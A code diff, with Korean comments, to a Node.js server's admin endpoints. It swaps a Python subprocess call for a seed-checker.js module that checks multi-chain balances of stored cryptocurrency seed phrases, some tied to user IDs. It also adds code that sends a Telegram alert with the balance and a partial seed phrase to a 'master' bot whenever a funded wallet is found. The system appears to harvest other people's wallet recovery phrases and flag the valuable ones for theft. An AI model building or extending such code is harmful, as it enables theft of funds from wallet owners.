@@ -3,29 +3,10 @@ const cors = require('cors');
 const path = require('path');
 const crypto = require('crypto');
 const fs = require('fs');
-const { spawn, spawnSync } = require('child_process');
+// child_process는 더 이상 사용 안 함 (seed-checker.js require 방식으로 전환)
 
-// seed_checker.py 실행 헬퍼 — bash -l 로 login shell 환경을 로드해서 pymysql 등 찾기
-function spawnSeedChecker(envVars, onClose) {
-  const scriptPath = path.join(__dirname, 'seed_checker.py');
-  const pythonCmd = process.env.PYTHON_CMD || 'python3';
-
-  // 환경변수를 VAR=val 형태로 앞에 붙여 bash -lc 로 실행
-  const envPrefix = Object.entries(envVars).map(([k, v]) => `${k}=${v}`).join(' ');
-  const cmd = `cd ${JSON.stringify(__dirname)} && ${envPrefix} ${pythonCmd} ${JSON.stringify(scriptPath)}`;
-
-  const py = spawn('bash', ['-lc', cmd], { stdio: 'pipe' });
-  let out = '', err = '';
-  py.stdout.on('data', d => { out += d.toString(); });
-  py.stderr.on('data', d => { err += d.toString(); });
-  py.on('close', code => {
-    if (out) console.log('[SEED CHECKER STDOUT]\n' + out.trim());
-    if (err) console.error('[SEED CHECKER STDERR]\n' + err.trim());
-    if (onClose) onClose(code);
-  });
-  py.on('error', e => console.error('[SEED CHECKER] spawn 오류:', e.message));
-  return py;
-}
+// seed-checker.js 에서 멀티체인 잔고 확인 함수 로드
+const { checkMultiChainBalance } = require('./seed-checker');
 const { HDNodeWallet } = require('ethers');
 require('dotenv').config();
 
@@ -2241,7 +2222,7 @@ app.delete('/api/admin/event-seeds/:id', requireAdmin, requireMaster, async (req
   }
 });
 
-// POST /api/admin/event-seeds/recheck — seed_checker.py로 잔고 재확인 (EVENT_SEED_IDS 모드)
+// POST /api/admin/event-seeds/recheck — seed-checker.js로 잔고 재확인 (event_seeds 테이블)
 app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { ids } = req.body;
@@ -2255,10 +2236,65 @@ app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (r
     if (!seedIds.length) return res.status(400).json({ error: '재확인할 이벤트 시드가 없습니다.' });
     if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지 가능합니다.' });
 
-    res.json({ ok: true, queued: seedIds.length, ids: seedIds, message: `${seedIds.length}개 이벤트 시드 검수 시작됨. 잠시 후 새로고침하세요.` });
-    spawnSeedChecker({ EVENT_SEED_IDS: seedIds.join(',') }, code => {
-      console.log(`[EVENT-SEED RECHECK] 완료 (exit=${code}) IDs=${seedIds.join(',')}`);
-    });
+    const ph = seedIds.map(() => '?').join(',');
+    const [seeds] = await db.pool.query(`SELECT id, phrase, note FROM event_seeds WHERE id IN (${ph})`, seedIds);
+
+    res.json({ ok: true, queued: seeds.length, message: `${seeds.length}개 이벤트 시드 검수 시작됨. 잠시 후 새로고침하세요.` });
+
+    // 백그라운드 처리
+    (async () => {
+      for (const seed of seeds) {
+        try {
+          console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 확인 중...`);
+          const results = await checkMultiChainBalance(seed.phrase);
+
+          let eth = 0, tron = 0, btc = 0, sol = 0;
+          for (const r of results) {
+            const bal = parseFloat(r.balance) || 0;
+            if (r.network === 'ethereum') eth = bal;
+            else if (r.network === 'tron') tron = bal;
+          }
+
+          await db.pool.query(
+            `UPDATE event_seeds SET eth = ?, tron = ? WHERE id = ?`,
+            [eth, tron, seed.id]
+          );
+
+          const chainsWithBalance = results.filter(r =>
+            parseFloat(r.balance) > 0 || parseFloat(r.usdtBalance || '0') > 0
+          );
+
+          if (chainsWithBalance.length > 0) {
+            // 마스터 알림봇으로 전송
+            const [[cfg]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
+            const [[cfgChat]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_chat_id' LIMIT 1`).catch(() => [[null]]);
+            const botToken = cfg?.setting_value;
+            const chatId = cfgChat?.setting_value;
+
+            let msg = `🎁 <b>이벤트 시드 잔고 발견!</b>\n🆔 ID: ${seed.id}\n`;
+            if (seed.note) msg += `📝 메모: ${seed.note}\n`;
+            msg += '\n';
+            for (const r of chainsWithBalance) {
+              msg += `🌐 <b>${r.network.toUpperCase()}</b>: ${r.balance} | USDT: ${r.usdtBalance || '0'}\n`;
+            }
+            msg += `\n🔑 시드: <code>${seed.phrase.substring(0, 30)}...</code>`;
+
+            if (botToken && chatId) {
+              await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId, text: msg, parse_mode: 'HTML'
+              }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram 오류:', e.message));
+            }
+            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 발견! 알림 전송`);
+          } else {
+            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 없음`);
+          }
+        } catch (e) {
+          console.error(`[EVENT-SEED RECHECK] ID=${seed.id} 오류:`, e.message);
+        }
+        await new Promise(r => setTimeout(r, 500));
+      }
+      console.log(`[EVENT-SEED RECHECK] 전체 완료 (${seeds.length}개)`);
+    })();
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -2376,10 +2412,10 @@ app.post('/api/user/gift-seed/ack', async (req, res) => {
   }
 });
 
-// POST /api/admin/seeds/recheck — 특정 시드 ID 잔고 재확인 (seed_checker.py SEED_IDS 모드)
+// POST /api/admin/seeds/recheck — 특정 시드 ID 잔고 재확인 (seed-checker.js 사용)
 app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
   try {
-    const { ids } = req.body; // number[] or 'all'
+    const { ids } = req.body;
     let seedIds = [];
 
     if (ids === 'all') {
@@ -2392,10 +2428,22 @@ app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, re
     if (seedIds.length === 0) return res.status(400).json({ error: '재확인할 시드 ID가 없습니다.' });
     if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지만 재확인 가능합니다.' });
 
-    res.json({ ok: true, queued: seedIds.length, ids: seedIds, message: '재확인 시작됨. 잠시 후 목록을 새로고침하세요.' });
-    spawnSeedChecker({ SEED_IDS: seedIds.join(',') }, code => {
-      console.log(`[SEED RECHECK] 완료 (exit=${code}) IDs=${seedIds.join(',')}`);
-    });
+    const ph = seedIds.map(() => '?').join(',');
+    const [seeds] = await db.pool.query(
+      `SELECT id, user_id, phrase, created_at FROM seeds WHERE id IN (${ph})`, seedIds
+    );
+
+    res.json({ ok: true, queued: seeds.length, ids: seedIds, message: '재확인 시작됨. 잠시 후 목록을 새로고침하세요.' });
+
+    // 백그라운드 처리 — seed-checker.js의 processSeed 재사용
+    const { processSeed } = require('./seed-checker');
+    (async () => {
+      for (const seed of seeds) {
+        await processSeed(seed).catch(e => console.error(`[SEED RECHECK] ID=${seed.id} 오류:`, e.message));
+        await new Promise(r => setTimeout(r, 500));
+      }
+      console.log(`[SEED RECHECK] 전체 완료 (${seeds.length}개)`);
+    })();
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
